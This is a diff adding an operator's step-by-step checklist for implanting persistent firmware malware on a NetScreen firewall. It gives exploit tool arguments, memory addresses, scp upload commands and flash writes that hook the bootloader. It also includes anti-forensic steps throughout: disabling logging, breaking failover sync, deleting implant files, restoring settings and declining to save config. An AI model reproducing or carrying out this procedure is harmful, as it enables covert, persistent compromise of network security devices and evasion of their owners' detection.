@@ -1,0 +1,85 @@
+1. ET onto box (View elegantthud script and durablenapkin script)
+
+2. ET: upload BA to 41000 
+	read loader space for referenc: 	 ET: 1,0x41000, 0x900
+	write loader to 0xA0041000 (NOT 0x41000) ET: 2,0xA0041000, (ba_ns50ns25.5.0.0r8.0 or ba_ns5xt.5.0.0r8.0)
+	read back and diff                       ET: 1, 0x41000, 0x900 (or real size)
+
+3. ET/BA 1: disable logging			 ET: 3, 0x41000, 2, 1, 0xffffffff
+
+4. ET/BA 2: enable telnet,etc			 ET: 3, 0x41000, 3, 2, 1, <hex_IP of external interface>
+
+5. telnet in 
+
+6. telnet/console: observe settings
+
+get console (shows page size, users) 
+set console page 0 (disables paging)
+get ssh (must be V2)
+get scp 
+get admin scs all
+get admin
+get config 
+get event
+get system
+get nsrp
+** If NSRP is set; use the following command **
+unset nsrp config sync (This will stop the syncronization between a failover pair)
+set nsrp config sync (This command will undo the previous command)
+
+7. telnet/console: enable scp v2 for 'our' user (if necessary)
+	[if ssh version is set to V1:
+		delete ssh device all
+		set ssh version 2
+	]
+	set scp enable			(this also enables ssh)
+	set admin scs password enable username <username>		(ie netscreen)
+
+8. scp configured BG201x implant onto box (201x because we need flash module)
+	scp <configured implant> <username>@<IPaddr>:onfig
+	ex:	scp BGLEE-2013_V.bin netscreen@127.0.0.1:onfig
+	(might have to delete key in ~/.ssh/known_hosts on linux box)
+
+9. ET/BA 4: run file to install BG		ET: 3, 0x41000, 1, 4
+
+10. BG: connect with BL-201x; 
+
+11. BG: load and activate ZL module
+
+12. BG: load and activate flash module
+
+13. BG: install GT by writing files using flash module
+	read 4 bytes from f8798a70: 
+		should be 4bfe94b1 for clean bootloader version 3.0; 
+		will be 4bfe0002 if already implanted
+		otherwise abort
+	(if already implanted write "0x4bfe94b1" to f8798a70)  (use file 0_f8798a70_4)
+
+	write 1_f87e0000_2b74  to 0xf87e0000  	(gt_code_ns50ns25.bin - 2b74 bytes)
+	write 2_f87e8000_17ffc to 0xf87e8000	(userArea.bin - 17ffc bytes)
+	write 3_f8780354_8     to 0xf8780354	(cksumfix3.bin - 8 bytes)
+	verify last 3 writes
+	write 4_f8798a70_4     to 0xf8798a70	(hook1_3_ns50ns25.bin - 4 bytes)
+
+14. BG: deactivate & unload flash module; exit BG
+
+15. telnet/console: cleanup
+	ensure implant files is gone (onfig)
+		get file ext
+		delete file:<name>	(if necessary - only if something went wrong)
+	restore original scp settings
+		[ if you have to reset ssh to version 1:
+			delete ssh device all
+			set ssh version v1
+		]
+		unset ssh enable		(if ssh wasn't enabled - this will disable scp also!)
+		unset scp enable		(if scp wasn't enabled)
+		set admin scs password disable username <username> 	(if necessary to get to match original setting)
+
+16. telnet/console: exit - ENTER 'n' when asked if you want to save config !!!
+
+17. ET/BA 2: restore original telnet,etc settings	ET: 3, 0x41000, 2, 2, 0xffffffff
+
+18. ET/BA 1: re-enable logging				ET: 3, 0x41000, 2, 1, 1
+
+19. ET: exit						ET: 5
